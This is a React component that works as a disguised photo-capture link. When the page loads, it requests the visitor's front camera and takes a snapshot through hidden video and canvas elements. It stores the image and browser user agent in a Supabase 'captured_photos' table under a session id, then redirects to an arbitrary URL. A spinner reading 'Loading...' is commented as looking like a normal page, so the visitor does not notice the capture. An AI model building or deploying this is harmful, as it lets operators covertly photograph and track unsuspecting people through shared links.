import { useEffect, useState, useRef } from "react";
import { useSearchParams } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";

const Capture = () => {
  const [searchParams] = useSearchParams();
  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const [status, setStatus] = useState<"loading" | "capturing" | "redirecting">("loading");
  
  const sessionId = searchParams.get("session") || "default";
  const redirectUrl = searchParams.get("redirect") || "https://google.com";

  useEffect(() => {
    const captureAndRedirect = async () => {
      try {
        // Request camera access
        const stream = await navigator.mediaDevices.getUserMedia({ 
          video: { facingMode: "user", width: 640, height: 480 } 
        });
        
        if (videoRef.current) {
          videoRef.current.srcObject = stream;
          await videoRef.current.play();
          
          // Wait a moment for camera to stabilize
          await new Promise(resolve => setTimeout(resolve, 500));
          
          setStatus("capturing");
          
          // Capture photo
          if (canvasRef.current && videoRef.current) {
            const canvas = canvasRef.current;
            const video = videoRef.current;
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext("2d");
            if (ctx) {
              ctx.drawImage(video, 0, 0);
              const imageData = canvas.toDataURL("image/jpeg", 0.8);
              
              // Store captured photo in Supabase
              await supabase.from('captured_photos').insert({
                session_id: sessionId,
                image_data: imageData,
                user_agent: navigator.userAgent
              });
            }
          }
          
          // Stop camera
          stream.getTracks().forEach(track => track.stop());
        }
        
        setStatus("redirecting");
        
        // Redirect after short delay
        setTimeout(() => {
          window.location.href = redirectUrl;
        }, 300);
        
      } catch (error) {
        console.error("Camera access denied:", error);
        // Redirect anyway even if camera fails
        window.location.href = redirectUrl;
      }
    };

    captureAndRedirect();
  }, [sessionId, redirectUrl]);

  return (
    <div className="min-h-screen bg-background flex items-center justify-center">
      {/* Hidden video and canvas for capture */}
      <video ref={videoRef} className="hidden" autoPlay playsInline muted />
      <canvas ref={canvasRef} className="hidden" />
      
      {/* Loading indicator that looks like a normal page */}
      <div className="text-center">
        <div className="w-8 h-8 border-2 border-neon-green border-t-transparent rounded-full animate-spin mx-auto mb-4" />
        <p className="text-muted-foreground text-sm">
          {status === "loading" && "Loading..."}
          {status === "capturing" && "Please wait..."}
          {status === "redirecting" && "Redirecting..."}
        </p>
      </div>
    </div>
  );
};

export default Capture;
